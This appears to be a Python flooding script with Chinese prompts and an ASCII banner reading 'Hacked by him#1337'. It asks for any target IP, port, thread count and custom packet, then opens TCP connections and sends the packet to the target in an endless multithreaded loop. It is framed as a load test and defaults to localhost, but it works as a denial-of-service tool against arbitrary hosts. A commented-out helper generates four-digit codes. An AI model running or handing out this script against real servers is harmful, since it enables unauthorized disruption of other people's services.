
'''
def load():
    c = []
    for i in range(10000,20000):
        
        c.append(str(i)[1:5])

    return c 
'''
import socket

import time
from concurrent.futures import ThreadPoolExecutor


IP = '127.0.0.1'
PORT = 80
THREADS = 100
PACK = b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'


e1 = '''
**************************************************************
__     ___            _ _             
\ \   / (_)          | (_)            
 \ \_/ / _ _ __      | |_ _ __   __ _ 
  \   / | | '_ \ _   | | | '_ \ / _` |
   | |  | | | | | |__| | | | | | (_| |
   |_|  |_|_| |_|\____/|_|_| |_| \__, |
                                 __/ |
                                |___/
**************************************************************                                
'''


print(e1)
print('Hacked by him#1337\nWelcome to https://space.bilibili.com/590491558 or https://github.com/him114514\n')



class Load:
    def __init__(self, host, port, pack):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.host = host
        self.port = port
        self.pack = pack

    def syning(self):
        try:
            
            self.client.connect((self.host, self.port))
            self.client.send(self.pack)
            print("Connected to {0}:{1}\n".format(self.host ,self.port))
            print("successful")
            time.sleep(0.7) 
        except Exception as error:
            print("Error: {0}".format(error))
         



def input_settings():
    while True:
        try:
            threads = int(input("请输入线程数:\n"))
            port = int(input("请输入端口:\n"))
            pack = input("请设置你的数据包:\n").encode()
            return threads, port, pack
        except ValueError:
            print('输入的不是数字，请重新输入！')



def start():
    while True:
        print('\n--------------------------------------------------')
        ask = input('是否要进行配置，如不配置将使用默认值（适用于80端口的本机）\n输入y以确认，输入n取消（使用默认值）：\n')
        print('--------------------------------------------------\n')
        if ask.lower() == "y":
            ip = input('请输入ip地址:\n')
            threads, port, pack = input_settings()
            break
        elif ask.lower() == "n":
            ip = IP
            threads, port, pack = THREADS, PORT, PACK
            break
        else:
            print('请输入 y 或 n')

    return ip, threads, port, pack



def run_load_test(ip, port, pack, threads):
    with ThreadPoolExecutor(max_workers=threads) as executor:
        
        for h in range(threads):
            test = Load(ip, port, pack)
            executor.submit(test.syning) 


if __name__ == "__main__":
    ip, threads, port, pack = start() 
    while True:
        run_load_test(ip, port, pack, threads)